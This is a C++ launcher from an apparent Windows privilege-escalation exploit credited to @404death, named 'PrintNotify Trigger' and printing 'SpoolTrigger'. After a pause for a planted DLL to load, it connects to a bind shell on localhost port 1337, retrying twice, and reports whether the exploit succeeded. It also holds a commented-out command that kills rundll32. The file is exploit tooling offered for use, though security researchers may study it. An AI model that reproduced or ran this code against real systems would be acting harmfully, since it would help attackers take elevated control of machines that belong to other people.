// launcher.cpp : PrintNotify Trigger by @404death.

#include <iostream>
#include <strsafe.h>
#include <tchar.h>
#include "TcpClient.h"

#define BUFSIZE 4096

int wmain(int argc, wchar_t** argv)
{

	wprintf_s(L"[+] SpoolTrigger by @404death !\n");



	// TCP connecting

	TcpClient tcpClient;
	int iRes = 0;

	// Try to trigger DLL loading 
	wprintf_s(L"[+] Trigger launched.\n");
	wprintf_s(L"[*] TCP connecting...\n");

	// Wait a bit before trying to connect to the bind shell.
	//  
	wprintf_s(L"[*] Waiting for the DLL to be loaded...\n");

	Sleep(2000);

	iRes = tcpClient.connectTCP("127.0.0.1", "1337");

	if (iRes != 0)
	{
		wprintf_s(L"[*] Retrying ...\n");

		iRes = tcpClient.connectTCP("127.0.0.1", "1337");
	}

	if (iRes != 0)
	{
		wprintf_s(L"[*] Retrying ...\n");


		iRes = tcpClient.connectTCP("127.0.0.1", "1337");
	}

	if (iRes != 0)
	{
		wprintf_s(L"[-] Exploit failed.");
	}
	else
	{
		//	system("taskkill /F /IM rundll32.exe /T > NUL 2>&1");
		wprintf_s(L"[+] Exploit successfull.");
	}

	return 0;

}